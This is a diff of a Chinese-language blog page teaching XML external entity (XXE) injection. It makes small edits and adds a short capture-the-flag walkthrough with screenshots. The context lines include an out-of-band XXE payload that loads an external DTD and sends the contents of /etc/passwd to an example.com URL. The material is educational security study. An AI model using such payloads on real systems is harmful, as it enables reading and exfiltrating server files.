@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en-us">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     <title>XXE 学习 | Bubble&#39;s blog</title>
 
     <meta charset="utf-8">
@@ -81,7 +81,7 @@
           ·
         </span>
         <span>
-          3134 words
+          3210 words
         </span>
         <span class="split">
           ·
@@ -132,7 +132,7 @@
 <p>在上面的例子中，定义了一个名为<code>productname</code>的内部实体，其值为<code> SuperWidget 2000</code>。在<code>&lt;name&gt;</code>元素中，通过<code> &amp;productname;</code> 引用了这个实体。</p>
 <p><strong>4. PCDATA:</strong> PCDATA是XML文档中被解析的字符数据。它包含文本，这些文本会被解析器检查以查找标记、实体引用等。</p>
 <p>在上面的例子中,<code>&lt;name&gt; </code>元素中的<code>&amp;productname;</code>实体引用在解析时会被替换为 SuperWidget 2000，但替换后的文本仍然是PCDATA的一部分。</p>
-<p><strong>5. CDATA:</strong> CDATA部分用于告诉解析器忽略其中的标记、实体引用等，将其视为纯文本,CDATA部分是通过特定的语法（<![CDATA[...]]>）来标记的。</p>
+<p><strong>5. CDATA:</strong> CDATA部分用于告诉解析器忽略其中的标记、实体引用等，将其视为纯文本,CDATA部分是通过特定的语法<code>（&lt;![CDATA[...]]&gt;）</code>来标记的。</p>
 <p>在上面的例子中，<code>&lt;description&gt; </code>元素使用了CDATA部分来包含包含特殊字符（如 &lt; 和 &amp;）的文本。这样，这些特殊字符就不会被解析器解释为标记或实体引用了。</p>
 <h2 id="dtd内部声明和外部引用"><strong>DTD内部声明和外部引用</strong> <a href="#dtd%e5%86%85%e9%83%a8%e5%a3%b0%e6%98%8e%e5%92%8c%e5%a4%96%e9%83%a8%e5%bc%95%e7%94%a8" class="anchor">🔗</a></h2><p>在XML中，DTD（Document Type Definition，文档类型定义）可以通过两种主要方式被声明：<strong>内部声明和外部引用</strong>。这两种方式在语法上有所不同，但它们都用于为XML文档提供验证规则和结构定义。</p>
 <p><strong>内部声明</strong></p>
@@ -258,6 +258,19 @@
 </span></span><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE a SYSTEM &#34;http://example.com/external.dtd&#34;&gt;</span>  
 </span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;a&gt;</span><span style="color:#999;font-weight:bold">&amp;send;</span><span style="color:#008000;font-weight:bold">&lt;/a&gt;</span>
 </span></span></code></pre></div><p>当XML处理器解析这个XML文档时，它会加载<code>external.dtd</code>文件，并解析其中的参数实体声明。由于<code>%all;</code>在DTD中被引用，它会展开为<code>send</code>实体的声明。最后，当XML处理器遇到<code>&amp;send;</code>时，它会尝试从指定的URL加载外部内容，并将URL中的<code>%file;</code>替换为<code>/etc/passwd</code>文件的内容。</p>
+<p>例题：<strong>XXE COURSE 1</strong></p>
+<p>打开题目是个登陆页面，随便写个登录</p>
+<p><p class="markdown-image">
+  <img src="/img/61.png" alt="alt text"  />
+</p></p>
+<p>抓包发现出现xml</p>
+<p><p class="markdown-image">
+  <img src="/img/62.png" alt="alt text"  />
+</p></p>
+<p>可以看到有个root元素，直接为其添加一个外部实体并在后续引用实现xxe</p>
+<p><p class="markdown-image">
+  <img src="/img/63.png" alt="alt text"  />
+</p></p>
 <p>参考：
 <a href="https://sinhub.cn/2020/11/xxe-learning/" target="_blank" rel="noopener">https://sinhub.cn/2020/11/xxe-learning/</a></p>
     </div>
